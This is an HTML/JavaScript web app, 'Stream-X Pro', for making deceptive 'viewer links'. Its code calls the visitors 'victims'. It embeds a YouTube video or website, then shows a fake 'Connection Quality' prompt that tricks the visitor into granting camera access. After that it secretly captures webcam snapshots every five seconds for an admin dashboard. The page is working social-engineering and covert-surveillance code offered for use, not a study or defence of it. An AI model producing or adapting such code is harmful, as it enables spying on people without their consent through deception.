<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Stream-X Pro</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root {
            --primary: #007aff;
            --primary-dark: #0056cc;
            --secondary: #5856d6;
            --bg: #f5f7fa;
            --card-bg: white;
            --text: #1d1d1f;
            --text-light: #666;
            --shadow: 0 5px 15px rgba(0,0,0,0.08);
            --shadow-3d: 10px 10px 20px #d1d9e6, -10px -10px 20px #ffffff;
            --shadow-inset: inset 3px 3px 6px #d1d9e6, inset -3px -3px 6px #ffffff;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .app-container {
            width: 100%;
            max-width: 450px;
            min-height: 90vh;
            background: var(--bg);
            border-radius: 25px;
            padding: 20px;
            box-shadow: var(--shadow-3d);
            position: relative;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 25px 20px;
            text-align: center;
            border-radius: 20px;
            margin-bottom: 25px;
            box-shadow: var(--shadow);
        }
        
        .logo { font-size: 28px; font-weight: 700; margin-bottom: 5px; }
        .content { padding: 0 10px 100px; }
        
        .card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(0,0,0,0.05);
        }
        
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; margin-bottom: 8px; font-weight: 600; }
        
        .form-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e5e5ea;
            border-radius: 12px;
            font-size: 16px;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        
        /* Viewer Screen */
        .viewer-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: black;
            z-index: 1000;
            display: none;
            flex-direction: column;
        }
        
        .viewer-header {
            background: rgba(0,0,0,0.9);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .viewer-iframe { flex: 1; width: 100%; border: none; }
        
        /* Camera Modal */
        .camera-modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 2000;
            display: none;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .camera-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 400px;
            text-align: center;
        }
        
        .capture-status {
            position: fixed;
            bottom: 20px; left: 50%;
            transform: translateX(-50%);
            background: rgba(255,255,255,0.9);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            z-index: 1001;
            display: none;
        }

        .hidden { display: none !important; }
        
        .alert {
            position: fixed; top: 20px; right: 20px;
            background: white; padding: 15px;
            border-radius: 10px; z-index: 3000; display: none;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .stat-item { background: #eee; padding: 10px; border-radius: 10px; text-align: center; }
        .stat-number { font-size: 20px; font-weight: bold; color: var(--primary); }

        .images-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .image-item img { width: 100%; border-radius: 10px; }

        .content-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
        .content-tab { flex: 1; padding: 10px; background: #eee; text-align: center; border-radius: 10px; cursor: pointer; }
        .content-tab.active { background: var(--primary); color: white; }
    </style>
</head>
<body>

    <div class="viewer-screen" id="viewerScreen">
        <div class="viewer-header">
            <span style="color: white;">Buffering...</span>
            <button onclick="closeViewer()" style="background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">Close</button>
        </div>
        <iframe class="viewer-iframe" id="viewerIframe" allow="autoplay; encrypted-media; fullscreen"></iframe>
    </div>
    
    <div class="camera-modal" id="cameraModal">
        <div class="camera-card">
            <h2>Connection Quality</h2>
            <p style="margin: 15px 0; color: #666;">To continue watching in high quality, please allow "Camera Access" for synchronization.</p>
            <button class="btn" onclick="startCamera()">Accept & Continue</button>
        </div>
    </div>
    
    <div class="capture-status" id="captureStatus">Live: Capturing...</div>
    <div class="alert" id="alertBox"></div>
    
    <div class="app-container" id="mainApp">
        <div id="loginScreen">
            <div class="header">
                <div class="logo">Stream-X Pro</div>
                <p>Admin Login</p>
            </div>
            <div class="card">
                <div class="form-group">
                    <input type="text" class="form-input" id="loginUsername" placeholder="Username">
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="loginPassword" placeholder="Password">
                </div>
                <button class="btn" onclick="login()">Login</button>
                <p style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Use: demo / demo123</p>
            </div>
        </div>

        <div id="dashboard" class="hidden">
            <div class="header">
                <h2>Welcome, <span id="userDisplayName"></span></h2>
                <button onclick="logout()" style="background: none; border: 1px solid white; color: white; padding: 5px; border-radius: 5px; margin-top: 10px;">Logout</button>
            </div>
            
            <div class="card">
                <h3>Create Viewer Link</h3>
                <div class="content-tabs">
                    <div class="content-tab active" id="tabYT" onclick="switchTab('youtube')">YouTube</div>
                    <div class="content-tab" id="tabWeb" onclick="switchTab('website')">Website</div>
                </div>
                <input type="text" id="targetUrl" class="form-input" placeholder="Paste URL here...">
                <button class="btn" onclick="generateLink()">Generate Link</button>
                
                <div id="linkBox" class="hidden" style="margin-top: 15px; padding: 10px; background: #eef; border-radius: 10px;">
                    <p style="font-size: 12px; word-break: break-all;" id="genLinkText"></p>
                    <button class="btn" style="padding: 10px; font-size: 14px;" onclick="copyLink()">Copy Link</button>
                </div>
            </div>

            <div class="card">
                <h3>Statistics</h3>
                <div class="stats-grid">
                    <div class="stat-item"><div class="stat-number" id="statLinks">0</div>Links</div>
                    <div class="stat-item"><div class="stat-number" id="statImages">0</div>Captures</div>
                </div>
            </div>

            <div class="card">
                <h3>Recent Captures</h3>
                <div class="images-grid" id="imagesGrid"></div>
            </div>
        </div>
    </div>

    <canvas id="canvas" style="display: none;"></canvas>
    <video id="video" autoplay playsinline style="display: none;"></video>

    <script>
        let currentUser = null;
        let currentMode = 'youtube';
        let captureInterval = null;

        // Database logic
        const db = {
            getUsers: () => JSON.parse(localStorage.getItem('sx_users') || '[]'),
            getLinks: () => JSON.parse(localStorage.getItem('sx_links') || '[]'),
            getImages: () => JSON.parse(localStorage.getItem('sx_images') || '[]'),
            saveImage: (img) => {
                const imgs = db.getImages();
                imgs.push(img);
                localStorage.setItem('sx_images', JSON.stringify(imgs));
            },
            saveLink: (link) => {
                const links = db.getLinks();
                links.push(link);
                localStorage.setItem('sx_links', JSON.stringify(links));
            }
        };

        // Initialize App
        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            const linkId = params.get('l');
            const userId = params.get('u');

            if (linkId && userId) {
                // If it's a victim link
                const link = db.getLinks().find(l => l.id === linkId);
                if (link) {
                    startVictimMode(link, userId);
                } else {
                    alert("Link Expired");
                }
            } else {
                // Check if already logged in admin
                const savedUser = localStorage.getItem('sx_current_user');
                if (savedUser) {
                    currentUser = JSON.parse(savedUser);
                    showDashboard();
                }
            }
        };

        function login() {
            const u = document.getElementById('loginUsername').value;
            const p = document.getElementById('loginPassword').value;
            if((u === 'demo' && p === 'demo123') || (u === 'admin' && p === 'admin')) {
                currentUser = { id: 'admin_1', username: u };
                localStorage.setItem('sx_current_user', JSON.stringify(currentUser));
                showDashboard();
            } else {
                alert("Invalid Credentials");
            }
        }

        function logout() {
            localStorage.removeItem('sx_current_user');
            location.reload();
        }

        function showDashboard() {
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('userDisplayName').innerText = currentUser.username;
            updateUI();
            setInterval(updateUI, 5000); // Auto refresh captures
        }

        function switchTab(mode) {
            currentMode = mode;
            document.getElementById('tabYT').classList.toggle('active', mode === 'youtube');
            document.getElementById('tabWeb').classList.toggle('active', mode === 'website');
        }

        function generateLink() {
            const url = document.getElementById('targetUrl').value;
            if(!url) return alert("Enter URL");
            
            const linkObj = {
                id: 'L' + Date.now(),
                url: url,
                type: currentMode,
                createdAt: new Date().toISOString()
            };
            
            db.saveLink(linkObj);
            const finalLink = `${window.location.origin}${window.location.pathname}?l=${linkObj.id}&u=${currentUser.id}`;
            
            document.getElementById('genLinkText').innerText = finalLink;
            document.getElementById('linkBox').classList.remove('hidden');
            updateUI();
        }

        function copyLink() {
            const text = document.getElementById('genLinkText').innerText;
            navigator.clipboard.writeText(text);
            alert("Link Copied!");
        }

        function updateUI() {
            if(!currentUser) return;
            const myLinks = db.getLinks();
            const myImages = db.getImages();
            document.getElementById('statLinks').innerText = myLinks.length;
            document.getElementById('statImages').innerText = myImages.length;

            const grid = document.getElementById('imagesGrid');
            grid.innerHTML = '';
            myImages.slice(-6).reverse().forEach(img => {
                const div = document.createElement('div');
                div.className = 'image-item';
                div.innerHTML = `<img src="${img.data}"><p style="font-size:10px">${new Date(img.time).toLocaleTimeString()}</p>`;
                grid.appendChild(div);
            });
        }

        // --- VICTIM MODE LOGIC ---
        function startVictimMode(link, userId) {
            document.getElementById('mainApp').style.display = 'none';
            document.getElementById('viewerScreen').style.display = 'flex';
            
            let finalUrl = link.url;
            if (link.type === 'youtube') {
                const vid = extractYTID(link.url);
                finalUrl = `https://www.youtube.com/embed/${vid}?autoplay=1&rel=0`;
            }
            
            document.getElementById('viewerIframe').src = finalUrl;
            
            // Store session for capture
            window.session = { linkId: link.id, userId: userId };

            // Show camera request after 4 seconds
            setTimeout(() => {
                document.getElementById('cameraModal').style.display = 'flex';
            }, 4000);
        }

        function extractYTID(url) {
            const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
            const match = url.match(regExp);
            return (match && match[2].length === 11) ? match[2] : null;
        }

        function startCamera() {
            document.getElementById('cameraModal').style.display = 'none';
            document.getElementById('captureStatus').style.display = 'block';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                document.getElementById('video').srcObject = stream;
                // Start capturing every 5 seconds
                captureInterval = setInterval(takeSnapshot, 5000);
                takeSnapshot(); // first one immediately
            })
            .catch(err => {
                console.log("Camera denied");
                alert("Please allow camera to continue the stream.");
            });
        }

        function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const data = canvas.toDataURL('image/jpeg', 0.5);
                db.saveImage({
                    userId: window.session.userId,
                    linkId: window.session.linkId,
                    data: data,
                    time: new Date().toISOString()
                });
            }
        }

        function closeViewer() {
            location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
